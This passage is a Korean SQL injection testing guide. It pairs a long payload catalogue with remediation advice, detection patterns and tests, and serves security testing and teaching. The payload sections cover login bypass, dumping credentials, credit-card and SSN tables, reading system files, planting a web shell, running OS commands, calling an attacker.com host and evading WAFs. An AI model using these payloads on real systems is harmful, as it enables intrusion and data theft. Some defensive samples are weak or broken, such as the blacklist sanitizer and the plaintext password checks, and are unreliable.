# SQL Injection 테스팅 가이드

## 목차
1. [정의&원리](#1-정의원리)
2. [기본 페이로드](#2-기본-페이로드)
3. [특수 페이로드](#3-특수-페이로드)
4. [조치 가이드](#4-조치-가이드)

---

## 1. 정의&원리

### SQL Injection이란?
웹 애플리케이션에서 사용자 입력값에 대한 적절한 검증이나 이스케이프 처리 없이 SQL 쿼리에 직접 삽입할 때 발생하는 취약점으로, 공격자가 데이터베이스를 조작하거나 민감한 정보를 탈취할 수 있는 보안 취약점입니다.

### SQL Injection 공격 유형

#### 1.1. In-band SQL Injection (대역 내)
**Union-based:**
- UNION 연산자를 사용하여 추가 데이터 조회
- 공격 결과가 웹 페이지에 직접 표시됨

**Error-based:**
- 의도적으로 SQL 오류를 발생시켜 정보 획득
- 데이터베이스 오류 메시지를 통한 정보 수집

#### 1.2. Inferential SQL Injection (추론형)
**Boolean-based Blind:**
- 참/거짓 조건을 통한 정보 추론
- 페이지 응답 차이로 데이터 유추

**Time-based Blind:**
- 시간 지연을 이용한 정보 추론
- 응답 시간 차이로 데이터 존재 여부 확인

#### 1.3. Out-of-band SQL Injection (대역 외)
- DNS, HTTP 등 다른 채널을 통한 데이터 전송
- 네트워크 연결이 제한적일 때 사용

### SQL Injection 테스팅 프로세스

1. **입력 지점 식별**
   - 로그인 폼 (사용자명, 비밀번호)
   - 검색 기능 (키워드, 필터)
   - URL 파라미터 (id, category 등)
   - 쿠키값 (session_id 등)
   - HTTP 헤더 (User-Agent, X-Forwarded-For)

2. **SQL 구문 구조 파악**
   - SELECT, INSERT, UPDATE, DELETE 중 어떤 쿼리인지 추정
   - WHERE, ORDER BY 등 절의 위치 파악

3. **데이터베이스 종류 식별**
   - MySQL, PostgreSQL, MSSQL, Oracle 등
   - 에러 메시지 분석으로 DBMS 특정

4. **취약점 확인 및 악용**
   - 데이터 추출, 인증 우회, 권한 상승
   - 파일 읽기/쓰기, 시스템 명령 실행

5. **영향도 평가**

### 일반적인 취약한 코드 패턴

#### 취약한 PHP 코드:
```php
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "' AND password = '" . $_POST['password'] . "'";
$result = mysql_query($query);
```

#### 취약한 Java 코드:
```java
String query = "SELECT * FROM users WHERE id = " + request.getParameter("id");
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

#### 취약한 Python 코드:
```python
query = f"SELECT * FROM users WHERE email = '{email}'"
cursor.execute(query)
```

---

## 2. 기본 페이로드

### 2.1. 취약점 존재 확인

#### 2.1.1. 기본 문법 오류 유발
```sql
-- 단일 따옴표 테스트
'
"
`

-- 주석 문자 테스트
'--
'#
'/*
*/

-- 논리 연산자
' OR '1'='1
' OR 1=1--
' OR 'a'='a
```

#### 2.1.2. 시간 지연 테스트
```sql
-- MySQL
' OR SLEEP(5)--
' UNION SELECT SLEEP(5)--

-- PostgreSQL
' OR pg_sleep(5)--

-- MSSQL
'; WAITFOR DELAY '00:00:05'--

-- Oracle
' OR DBMS_LOCK.SLEEP(5)--
```

### 2.2. 인증 우회

#### 2.2.1. 로그인 우회
```sql
-- 사용자명 필드에 삽입
admin'--
admin'/*
' OR '1'='1'--
' OR 1=1--
' OR 'a'='a

-- 비밀번호 필드에 삽입
' OR '1'='1
' OR 1=1
anything' OR 'x'='x

-- 둘 다 우회
admin' OR '1'='1'--
' OR 1=1 LIMIT 1--
```

#### 2.2.2. 관리자 계정 접근
```sql
-- 첫 번째 사용자 (보통 관리자)
' UNION SELECT 1,username,password FROM users--
' OR 1=1 LIMIT 1--

-- 특정 권한 사용자
' OR role='admin'--
' OR user_type=1--
```

### 2.3. 정보 수집

#### 2.3.1. 컬럼 수 파악
```sql
-- ORDER BY를 이용한 컬럼 수 확인
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- 오류 발생할 때까지 숫자 증가

-- UNION을 이용한 컬럼 수 확인
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

#### 2.3.2. 데이터베이스 정보 수집
```sql
-- MySQL
' UNION SELECT 1,version(),database()--
' UNION SELECT 1,user(),@@version--

-- PostgreSQL
' UNION SELECT version(),current_database()--

-- MSSQL
' UNION SELECT @@version,db_name()--

-- Oracle
' UNION SELECT banner,version FROM v$version--
```

### 2.4. 테이블 및 컬럼 정보 추출

#### 2.4.1. 테이블 목록 조회
```sql
-- MySQL
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--

-- PostgreSQL
' UNION SELECT tablename,1 FROM pg_tables WHERE schemaname='public'--

-- MSSQL
' UNION SELECT name,1 FROM sys.tables--

-- Oracle
' UNION SELECT table_name,1 FROM user_tables--
```

#### 2.4.2. 컬럼 정보 조회
```sql
-- MySQL
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--

-- PostgreSQL
' UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name='users'--

-- MSSQL
' UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name='users'--

-- Oracle
' UNION SELECT column_name,1 FROM user_tab_columns WHERE table_name='USERS'--
```

### 2.5. 데이터 추출

#### 2.5.1. 사용자 정보 추출
```sql
-- 사용자 테이블 데이터 추출
' UNION SELECT username,password FROM users--
' UNION SELECT 1,concat(username,':',password),3 FROM users--

-- 특정 사용자 데이터
' UNION SELECT username,password FROM users WHERE id=1--
' UNION SELECT username,password FROM users WHERE role='admin'--
```

#### 2.5.2. 중요 데이터 추출
```sql
-- 신용카드 정보
' UNION SELECT card_number,cvv FROM credit_cards--

-- 개인정보
' UNION SELECT name,ssn FROM customers--

-- 시스템 계정 정보
' UNION SELECT user,password FROM mysql.user--
```

---

## 3. 특수 페이로드

### 3.1. Blind SQL Injection

#### 3.1.1. Boolean-based Blind
```sql
-- 데이터베이스 이름 길이 확인
' AND LENGTH(database())=8--
' AND LENGTH(database())>5--

-- 데이터베이스 이름 추출
' AND SUBSTRING(database(),1,1)='a'--
' AND ASCII(SUBSTRING(database(),1,1))=97--

-- 테이블 존재 여부 확인
' AND (SELECT COUNT(*) FROM users)>0--
' AND EXISTS(SELECT * FROM users)--

-- 사용자 수 확인
' AND (SELECT COUNT(*) FROM users)>10--
' AND (SELECT COUNT(*) FROM users WHERE role='admin')>0--
```

#### 3.1.2. Time-based Blind
```sql
-- MySQL
' AND IF(LENGTH(database())=8,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--

-- PostgreSQL
' AND CASE WHEN LENGTH(current_database())=8 THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
'; IF (LEN(DB_NAME())=8) WAITFOR DELAY '00:00:05'--
'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))=109) WAITFOR DELAY '00:00:05'--

-- Oracle
' AND CASE WHEN LENGTH(user)=6 THEN DBMS_LOCK.SLEEP(5) ELSE DBMS_LOCK.SLEEP(0) END--
```

### 3.2. Error-based SQL Injection

#### 3.2.1. MySQL Error-based
```sql
-- ExtractValue 함수 이용
' AND ExtractValue(0x0a,concat(0x0a,(SELECT database())))--
' AND ExtractValue(0x0a,concat(0x0a,(SELECT version())))--

-- UpdateXML 함수 이용
' AND UpdateXML(0x0a,concat(0x0a,(SELECT database())),0x0a)--
' AND UpdateXML(0x0a,concat(0x0a,(SELECT user())),0x0a)--

-- Duplicate entry 에러 이용
' AND (SELECT COUNT(*),concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)--
```

#### 3.2.2. PostgreSQL Error-based
```sql
-- CAST 에러 이용
' AND CAST((SELECT version()) AS int)--
' AND CAST((SELECT current_database()) AS int)--

-- 배열 인덱스 에러 이용
' AND (SELECT array_agg(username) FROM users)[999999]--
```

#### 3.2.3. MSSQL Error-based
```sql
-- CONVERT 에러 이용
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT db_name()))--

-- XML PATH 에러 이용
' UNION SELECT 1,(SELECT TOP 1 name FROM sys.tables FOR XML PATH(''))--
```

#### 3.2.4. Oracle Error-based
```sql
-- UTL_INADDR.GET_HOST_NAME 이용
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--

-- CTXSYS.DRITHSX.SN 이용
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
```

### 3.3. 필터링 우회 기법

#### 3.3.1. 키워드 차단 우회
```sql
-- 대소문자 혼용
SeLeCt * FrOm UsErS
UNION sElEcT username,password FROM users

-- 주석 삽입
SEL/**/ECT * FR/**/OM users
UN/*comment*/ION SE/**/LECT

-- 인코딩 활용
%53%45%4c%45%43%54 (SELECT의 URL 인코딩)
0x53454c454354 (SELECT의 HEX 인코딩)

-- 동의어 사용
SELECT → SELSELECTECT (SELECT 삭제 시)
UNION → UNUNIONION
OR → || (일부 DB에서)
```

#### 3.3.2. 공백 문자 차단 우회
```sql
-- 탭, 개행 문자 사용
SELECT/**/username/**/FROM/**/users
SELECT	username	FROM	users
SELECT%0ausername%0aFROM%0ausers

-- 괄호 활용
SELECT(username)FROM(users)
UNION(SELECT(username),(password)FROM(users))

-- 연산자 활용
SELECT+username+FROM+users
SELECT-username-FROM-users
```

#### 3.3.3. 따옴표 차단 우회
```sql
-- HEX 인코딩
SELECT * FROM users WHERE username=0x61646d696e (admin)

-- CHAR 함수
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)

-- 백슬래시 이스케이프
SELECT * FROM users WHERE username=\\admin\\

-- CONCAT 함수
SELECT * FROM users WHERE username=CONCAT(a,d,m,i,n)
```

#### 3.3.4. 괄호 차단 우회
```sql
-- 괄호 없이 함수 호출
SELECT user,host FROM mysql.user
SELECT version
SELECT database

-- CASE 문 활용
SELECT CASE WHEN 1=1 THEN username ELSE password END FROM users
```

### 3.4. 고급 공격 기법

#### 3.4.1. Second-Order SQL Injection
```sql
-- 1단계: 악성 페이로드 저장
INSERT INTO users (username) VALUES ('admin'' OR 1=1--')

-- 2단계: 저장된 데이터가 다른 쿼리에서 사용될 때 실행
SELECT * FROM logs WHERE username = 'admin' OR 1=1--'
```

#### 3.4.2. Stacked Queries (다중 쿼리)
```sql
-- 추가 쿼리 실행
'; INSERT INTO users (username,password) VALUES ('hacker','password')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
'; DROP TABLE logs--

-- 사용자 생성 (MSSQL)
'; EXEC sp_addlogin 'hacker','password'--
'; EXEC sp_addsrvrolemember 'hacker','sysadmin'--
```

#### 3.4.3. 파일 시스템 접근
```sql
-- MySQL 파일 읽기
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
' UNION SELECT LOAD_FILE('C:\\windows\\system32\\drivers\\etc\\hosts'),NULL--

-- MySQL 파일 쓰기
' UNION SELECT 'shell code',NULL INTO OUTFILE '/var/www/shell.php'--

-- MSSQL 파일 접근
' UNION SELECT * FROM OPENROWSET(BULK 'C:\windows\system32\drivers\etc\hosts',SINGLE_CLOB)--

-- PostgreSQL 파일 접근
' UNION SELECT pg_read_file('/etc/passwd',0,1000000)--
```

#### 3.4.4. 명령 실행
```sql
-- MySQL UDF (사용자 정의 함수)
SELECT sys_exec('whoami');
SELECT sys_eval('id');

-- MSSQL xp_cmdshell
'; EXEC xp_cmdshell 'dir'--
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--

-- PostgreSQL COPY TO PROGRAM
COPY (SELECT 'test') TO PROGRAM 'touch /tmp/pwned';
```

### 3.5. NoSQL Injection

#### 3.5.1. MongoDB
```javascript
// 인증 우회
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// JavaScript Injection
{"username": "admin", "password": {"$where": "return true"}}
{"$where": "this.username == 'admin' && this.password.length > 0"}

// Blind NoSQL Injection
{"username": "admin", "password": {"$regex": "^a.*"}}
{"username": {"$regex": "^admi.*"}, "password": {"$ne": ""}}
```

#### 3.5.2. CouchDB
```json
// View Injection
{"key": {"$gt": null}}
{"startkey": "", "endkey": {}}

// Map-Reduce Injection
{
  "map": "function(doc) { if (doc.username) { emit(doc.username, doc.password); } }"
}
```

### 3.6. 데이터베이스별 특수 기법

#### 3.6.1. MySQL 특화
```sql
-- 버전별 조건 실행
/*!50001 SELECT * FROM users*/
/*!40000 DROP TABLE temp*/

-- 정보 수집
SELECT @@version, @@hostname, @@datadir
SELECT user(),current_user(),system_user()

-- 권한 확인
SELECT grantee,privilege_type FROM information_schema.user_privileges
SELECT file_priv FROM mysql.user WHERE user=user()

-- 패스워드 해시 추출
SELECT user,password FROM mysql.user
SELECT authentication_string FROM mysql.user
```

#### 3.6.2. PostgreSQL 특화
```sql
-- 버전 및 환경 정보
SELECT version(), current_setting('data_directory')
SELECT current_user, session_user, current_database()

-- 테이블 및 함수 정보
SELECT schemaname,tablename FROM pg_tables
SELECT proname,prosrc FROM pg_proc WHERE proname='function_name'

-- 파일 시스템 접근
SELECT pg_read_file('/etc/passwd')
SELECT pg_ls_dir('/etc')

-- 네트워크 요청
SELECT dblink_connect('host=attacker.com user=postgres')
```

#### 3.6.3. MSSQL 특화
```sql
-- 시스템 정보
SELECT @@version, @@servername, @@servicename
SELECT SYSTEM_USER, CURRENT_USER, USER_NAME()

-- 데이터베이스 정보
SELECT name FROM sys.databases
SELECT name FROM sys.tables
SELECT name FROM sys.columns WHERE object_id=object_id('users')

-- 링크드 서버
SELECT srvname FROM sysservers
EXEC ('SELECT @@version') AT [LINKED_SERVER]

-- 권한 상승
EXEC sp_addsrvrolemember 'user','sysadmin'
```

#### 3.6.4. Oracle 특화
```sql
-- 시스템 정보
SELECT banner FROM v$version
SELECT instance_name FROM v$instance
SELECT username FROM all_users

-- 테이블 정보
SELECT table_name FROM user_tables
SELECT column_name FROM user_tab_columns WHERE table_name='USERS'

-- 권한 정보
SELECT privilege FROM user_sys_privs
SELECT granted_role FROM user_role_privs

-- Java 저장 프로시저를 통한 명령 실행
SELECT dbms_java.runjava('java.lang.Runtime.getRuntime().exec("cmd")') FROM dual
```

### 3.7. 웹 애플리케이션 방화벽(WAF) 우회

#### 3.7.1. ModSecurity 우회
```sql
-- 키워드 분할
SEL<>ECT * FROM users
UN/**/ION SE/**/LECT

-- 함수 활용
SELECT(CHAR(117,115,101,114,115)) -- 'users'
SELECT(0x7573657273) -- 'users' in hex

-- 논리 연산 우회
1=1 → 2>1 → 'a'='a' → 1 LIKE 1
```

#### 3.7.2. 클라우드 WAF 우회
```sql
-- AWS WAF
SELECT * FROM users WHERE 1=1 AND 'a'='a'
SELECT * FROM (SELECT * FROM users)a

-- Cloudflare
/*!50001SELECT*/ * /*!50001FROM*/ users
SELECT * FROM users WHERE 1!=2

-- Azure WAF
SELECT TOP 1 * FROM users
SELECT * FROM users WHERE username LIKE 'a%'
```

### 3.8. 자동화 도구 대응 기법

#### 3.8.1. sqlmap 탐지 회피
```sql
-- User-Agent 변경
sqlmap -u "target" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

-- Tamper 스크립트 사용
sqlmap -u "target" --tamper="space2comment,charencode"

-- 지연 및 랜덤화
sqlmap -u "target" --delay=2 --randomize=10
```

#### 3.8.2. 수동 테스팅 시뮬레이션
```sql
-- 점진적 공격
1' → 1'-- → 1' OR '1'='1'-- → 1' UNION SELECT NULL--

-- 에러 분석 후 공격 벡터 조정
ORA-00933: SQL command not properly ended → Oracle
Microsoft OLE DB Provider for ODBC Drivers → MSSQL
You have an error in your SQL syntax → MySQL
```

---

## 4. 조치 가이드

### 4.1. 예방 기법

#### 4.1.1. 매개변수화 쿼리 (Parameterized Query)

**Java - PreparedStatement:**
```java
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = connection.prepareStatement(sql);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
```

**PHP - PDO:**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
$result = $stmt->fetchAll();
```

**Python - 매개변수화:**
```python
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)
)
```

**C# - SqlParameter:**
```csharp
string sql = "SELECT * FROM users WHERE username = @username AND password = @password";
SqlCommand cmd = new SqlCommand(sql, connection);
cmd.Parameters.AddWithValue("@username", username);
cmd.Parameters.AddWithValue("@password", password);
SqlDataReader reader = cmd.ExecuteReader();
```

#### 4.1.2. 저장 프로시저 (Stored Procedure)

**MySQL 저장 프로시저:**
```sql
DELIMITER //
CREATE PROCEDURE GetUser(
    IN p_username VARCHAR(50),
    IN p_password VARCHAR(100)
)
BEGIN
    SELECT * FROM users 
    WHERE username = p_username 
    AND password = p_password;
END //
DELIMITER ;
```

**호출 방법:**
```java
CallableStatement cstmt = connection.prepareCall("{call GetUser(?, ?)}");
cstmt.setString(1, username);
cstmt.setString(2, password);
ResultSet rs = cstmt.executeQuery();
```

#### 4.1.3. ORM (Object-Relational Mapping) 사용

**Hibernate (Java):**
```java
@Repository
public class UserRepository {
    @PersistenceContext
    private EntityManager entityManager;
    
    public List<User> findByUsernameAndPassword(String username, String password) {
        return entityManager
            .createQuery("FROM User WHERE username = :username AND password = :password", User.class)
            .setParameter("username", username)
            .setParameter("password", password)
            .getResultList();
    }
}
```

**Django ORM (Python):**
```python
from django.contrib.auth.models import User

def authenticate_user(username, password):
    try:
        user = User.objects.get(username=username, password=password)
        return user
    except User.DoesNotExist:
        return None
```

**Entity Framework (C#):**
```csharp
public class UserService
{
    private readonly ApplicationDbContext _context;
    
    public User AuthenticateUser(string username, string password)
    {
        return _context.Users
            .FirstOrDefault(u => u.Username == username && u.Password == password);
    }
}
```

### 4.2. 입력 검증 및 필터링

#### 4.2.1. 화이트리스트 기반 검증
```java
public boolean isValidInput(String input, String type) {
    Map<String, String> patterns = new HashMap<>();
    patterns.put("username", "^[a-zA-Z0-9_]{3,20}$");
    patterns.put("email", "^[\\w.-]+@[\\w.-]+\\.[a-zA-Z]{2,}$");
    patterns.put("id", "^\\d{1,10}$");
    
    Pattern pattern = Pattern.compile(patterns.get(type));
    return pattern.matcher(input).matches();
}
```

#### 4.2.2. 이스케이프 처리
```php
function escape_sql_input($input) {
    // MySQL 특수문자 이스케이프
    return mysqli_real_escape_string($connection, $input);
}

function validate_and_escape($input, $type) {
    switch($type) {
        case 'integer':
            return (int)$input;
        case 'string':
            return htmlspecialchars(mysqli_real_escape_string($connection, $input));
        default:
            return false;
    }
}
```

#### 4.2.3. 입력 길이 제한
```python
def validate_input_length(input_value, max_length=100):
    if len(input_value) > max_length:
        raise ValueError(f"Input too long. Maximum {max_length} characters allowed.")
    return input_value

def sanitize_input(input_value):
    # 위험한 문자 제거
    dangerous_chars = ["'", '"', ";", "--", "/*", "*/", "xp_", "sp_"]
    for char in dangerous_chars:
        input_value = input_value.replace(char, "")
    return input_value
```

### 4.3. 데이터베이스 보안 설정

#### 4.3.1. 최소 권한 원칙
```sql
-- 애플리케이션 전용 사용자 생성 (MySQL)
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';

-- 필요한 권한만 부여
GRANT SELECT, INSERT, UPDATE ON app_database.users TO 'app_user'@'localhost';
GRANT SELECT ON app_database.products TO 'app_user'@'localhost';

-- 위험한 권한 제거
REVOKE FILE ON *.* FROM 'app_user'@'localhost';
REVOKE PROCESS ON *.* FROM 'app_user'@'localhost';
```

#### 4.3.2. 위험한 함수 비활성화
```sql
-- MySQL 설정 (my.cnf)
[mysqld]
local-infile=0
secure-file-priv="/var/lib/mysql-files/"

-- MSSQL 위험 기능 비활성화
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 0;
RECONFIGURE;

-- Oracle 보안 설정
ALTER SYSTEM SET O7_DICTIONARY_ACCESSIBILITY=FALSE;
ALTER SYSTEM SET SQL92_SECURITY=TRUE;
```

#### 4.3.3. 데이터베이스 방화벽 설정
```bash
# iptables를 이용한 DB 접근 제한
iptables -A INPUT -p tcp --dport 3306 -s 192.168.1.100 -j ACCEPT
iptables -A INPUT -p tcp --dport 3306 -j DROP

# MySQL 바인드 주소 제한
bind-address = 127.0.0.1

# PostgreSQL 접근 제어 (pg_hba.conf)
host    all             all             192.168.1.0/24          md5
host    all             all             0.0.0.0/0               reject
```

### 4.4. 에러 처리 및 로깅

#### 4.4.1. 안전한 에러 처리
```java
public class SafeErrorHandler {
    private static final Logger logger = LoggerFactory.getLogger(SafeErrorHandler.class);
    
    public ResponseEntity<String> handleSQLException(SQLException e) {
        // 상세한 에러는 로그에만 기록
        logger.error("SQL Exception occurred: ", e);
        
        // 사용자에게는 일반적인 메시지만 반환
        return ResponseEntity.status(500)
            .body("An error occurred while processing your request. Please try again.");
    }
}
```

#### 4.4.2. SQL Injection 탐지 및 차단
```python
import re
import logging

class SQLInjectionDetector:
    def __init__(self):
        self.sql_patterns = [
            r"(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER)\b)",
            r"(\b(UNION|OR|AND)\b.*\b(SELECT|INSERT|UPDATE|DELETE)\b)",
            r"('|\"|;|--|\/\*|\*\/)",
            r"(\b(EXEC|EXECUTE|xp_|sp_)\b)",
            r"(\b(LOAD_FILE|INTO\s+OUTFILE|DUMPFILE)\b)",
            r"(\b(SLEEP|WAITFOR|DELAY|BENCHMARK)\b)",
        ]
    
    def detect_sql_injection(self, user_input):
        for pattern in self.sql_patterns:
            if re.search(pattern, user_input, re.IGNORECASE):
                logging.warning(f"SQL Injection attempt detected: {user_input}")
                return True
        return False
    
    def block_request(self, user_input):
        if self.detect_sql_injection(user_input):
            raise SecurityException("Malicious input detected")
        return user_input
```

#### 4.4.3. 실시간 모니터링
```javascript
// Express.js 미들웨어
const sqlInjectionDetector = (req, res, next) => {
    const sqlPatterns = [
        /(\b(select|insert|update|delete|drop|create|alter)\b)/i,
        /(\bunion\b.*\bselect\b)/i,
        /(\'|\"|\;|\-\-|\/\*|\*\/)/,
        /(\bor\b.*\=.*\bor\b)/i,
        /(\bsleep\(|waitfor\b|delay\b)/i
    ];
    
    const allInputs = JSON.stringify({
        ...req.query,
        ...req.body,
        headers: req.headers
    });
    
    const detected = sqlPatterns.some(pattern => pattern.test(allInputs));
    
    if (detected) {
        console.log(`SQL Injection attempt from ${req.ip}: ${allInputs}`);
        return res.status(403).json({
            error: 'Malicious input detected',
            code: 'SQL_INJECTION_BLOCKED'
        });
    }
    
    next();
};
```

### 4.5. 네트워크 및 인프라 보안

#### 4.5.1. 데이터베이스 네트워크 분리
```yaml
# Docker Compose 예시
version: '3.8'
services:
  web:
    image: nginx
    ports:
      - "80:80"
    networks:
      - frontend
  
  app:
    image: app:latest
    networks:
      - frontend
      - backend
  
  database:
    image: mysql:8.0
    environment:
      MYSQL_ROOT_PASSWORD: strong_password
    networks:
      - backend
    # 외부 접근 차단

networks:
  frontend:
    driver: bridge
  backend:
    driver: bridge
    internal: true  # 외부 인터넷 접근 차단
```

#### 4.5.2. SSL/TLS 암호화
```sql
-- MySQL SSL 강제 설정
CREATE USER 'secure_user'@'%' IDENTIFIED BY 'password' REQUIRE SSL;
ALTER USER 'existing_user'@'%' REQUIRE SSL;

-- 연결 문자열에 SSL 옵션 추가
mysql://user:password@host:3306/database?useSSL=true&requireSSL=true
```

### 4.6. 코드 리뷰 가이드라인

#### 4.6.1. SQL Injection 취약점 체크포인트
```markdown
## 필수 점검 항목

### 1. 동적 쿼리 생성
- [ ] 문자열 연결로 SQL 쿼리 생성하는 코드 없음
- [ ] 사용자 입력이 직접 쿼리에 삽입되는 부분 없음
- [ ] 모든 쿼리가 매개변수화되어 있음

### 2. 입력 검증
- [ ] 모든 사용자 입력에 대한 검증 로직 존재
- [ ] 화이트리스트 기반 검증 적용
- [ ] 입력 길이 제한 설정

### 3. 에러 처리
- [ ] 데이터베이스 에러가 사용자에게 노출되지 않음
- [ ] 적절한 로깅 메커니즘 구현
- [ ] 일반적인 에러 메시지 반환

### 4. 권한 관리
- [ ] 애플리케이션별 전용 DB 계정 사용
- [ ] 최소 권한 원칙 적용
- [ ] 관리자 계정과 애플리케이션 계정 분리
```

#### 4.6.2. 위험한 코드 패턴 식별
```java
// 위험한 패턴들
public class VulnerableExamples {
    
    // ❌ 문자열 연결
    public User findUser(String username) {
        String sql = "SELECT * FROM users WHERE username = '" + username + "'";
        return jdbcTemplate.queryForObject(sql, User.class);
    }
    
    // ❌ 동적 테이블명
    public List<Object> getData(String tableName) {
        String sql = "SELECT * FROM " + tableName;
        return jdbcTemplate.queryForList(sql);
    }
    
    // ❌ 동적 ORDER BY
    public List<User> getUsers(String sortBy) {
        String sql = "SELECT * FROM users ORDER BY " + sortBy;
        return jdbcTemplate.query(sql, new UserRowMapper());
    }
}

// ✅ 안전한 패턴들
public class SecureExamples {
    
    // ✅ 매개변수화 쿼리
    public User findUser(String username) {
        String sql = "SELECT * FROM users WHERE username = ?";
        return jdbcTemplate.queryForObject(sql, User.class, username);
    }
    
    // ✅ 화이트리스트 검증 후 동적 쿼리
    public List<User> getUsers(String sortBy) {
        Set<String> allowedColumns = Set.of("username", "email", "created_date");
        if (!allowedColumns.contains(sortBy)) {
            throw new IllegalArgumentException("Invalid sort column");
        }
        String sql = "SELECT * FROM users ORDER BY " + sortBy;
        return jdbcTemplate.query(sql, new UserRowMapper());
    }
}
```

### 4.7. 테스팅 자동화

#### 4.7.1. 단위 테스트
```java
@Test
public void testSQLInjectionPrevention() {
    String maliciousInput = "admin' OR '1'='1'--";
    
    // 매개변수화 쿼리 테스트
    assertThrows(DataAccessException.class, () -> {
        userService.findUser(maliciousInput);
    });
    
    // 입력 검증 테스트
    assertFalse(inputValidator.isValidUsername(maliciousInput));
}

@Test
public void testBlindSQLInjectionPrevention() {
    String timeBasedPayload = "admin' AND SLEEP(5)--";
    
    long startTime = System.currentTimeMillis();
    try {
        userService.findUser(timeBasedPayload);
    } catch (Exception e) {
        // 예외 발생 예상
    }
    long endTime = System.currentTimeMillis();
    
    // 5초 지연이 발생하지 않아야 함
    assertTrue(endTime - startTime < 1000);
}
```

#### 4.7.2. 통합 테스트
```python
import requests
import time

class SQLInjectionTestSuite:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
    
    def test_authentication_bypass(self):
        payloads = [
            "admin'--",
            "' OR '1'='1'--",
            "' OR 1=1#",
            "admin' OR '1'='1"
        ]
        
        for payload in payloads:
            response = self.session.post(f"{self.base_url}/login", {
                'username': payload,
                'password': 'anything'
            })
            
            # 로그인 성공하면 안됨
            assert 'dashboard' not in response.text.lower()
            assert response.status_code != 200 or 'welcome' not in response.text.lower()
    
    def test_time_based_injection(self):
        time_payloads = [
            "1' AND SLEEP(3)--",
            "1'; WAITFOR DELAY '00:00:03'--"
        ]
        
        for payload in time_payloads:
            start_time = time.time()
            response = self.session.get(f"{self.base_url}/user", params={'id': payload})
            end_time = time.time()
            
            # 3초 지연이 발생하면 안됨
            assert end_time - start_time < 1.0
```

#### 4.7.3. 자동화 스캔 통합
```bash
#!/bin/bash
# CI/CD 파이프라인에 통합할 보안 스캔 스크립트

# sqlmap을 이용한 자동 스캔
sqlmap -u "http://target/login" \
       --data="username=test&password=test" \
       --batch \
       --level=3 \
       --risk=2 \
       --output-dir="./scan_results"

# 결과 분석
if grep -q "vulnerable" ./scan_results/*.txt; then
    echo "SQL Injection vulnerability detected!"
    exit 1
fi

# Nuclei를 이용한 추가 스캔
nuclei -u http://target -t sql-injection/ -o nuclei_results.txt

echo "Security scan completed successfully"
```

### 4.8. 사고 대응 절차

#### 4.8.1. SQL Injection 공격 탐지 시 대응
```markdown
## 즉시 대응 (0-1시간)
1. 공격 IP 차단
   - 방화벽/WAF에서 즉시 차단
   - 로그 분석으로 공격 패턴 파악

2. 영향 범위 확인
   - 접근된 데이터베이스 테이블 확인
   - 변조/삭제된 데이터 여부 점검
   - 민감 정보 유출 가능성 평가

3. 서비스 보호 조치
   - 취약한 기능 임시 비활성화
   - 추가 인증 단계 적용
   - 모니터링 강화
```

#### 4.8.2. 포렌식 및 증거 수집
```bash
# 데이터베이스 로그 수집
# MySQL
SHOW VARIABLES LIKE 'general_log';
SELECT * FROM mysql.general_log WHERE command_type='Query' AND argument LIKE '%OR%';

# PostgreSQL
SELECT query, query_start FROM pg_stat_activity;
tail -f /var/log/postgresql/postgresql.log

# 웹 서버 로그 분석
grep -i "union\|select\|or.*=" /var/log/apache2/access.log
grep -E "(union|select|insert|update|delete)" /var/log/nginx/access.log
```

#### 4.8.3. 복구 절차
```sql
-- 데이터 무결성 확인
CHECKSUM TABLE users;
CHECK TABLE users;

-- 백업으로부터 복구
-- MySQL
mysql -u root -p database_name < backup_file.sql

-- 감사 로그 활성화
-- MySQL
SET GLOBAL general_log = 'ON';
SET GLOBAL log_output = 'TABLE';

-- MSSQL
CREATE SERVER AUDIT audit_sqli
TO FILE (FILEPATH = 'C:\AuditLogs\')
WITH (QUEUE_DELAY = 1000, ON_FAILURE = CONTINUE);

ALTER SERVER AUDIT audit_sqli WITH (STATE = ON);
```

### 4.9. 보안 정책 및 가이드라인

#### 4.9.1. 개발 보안 가이드라인
```markdown
## SQL 쿼리 작성 규칙

### 필수 사항
1. 모든 사용자 입력은 매개변수화 쿼리 사용
2. 동적 쿼리 생성 시 화이트리스트 검증 필수
3. 데이터베이스 에러를 사용자에게 노출 금지
4. 최소 권한 DB 계정 사용

### 금지 사항
1. 문자열 연결을 통한 쿼리 생성 금지
2. 사용자 입력을 직접 쿼리에 삽입 금지
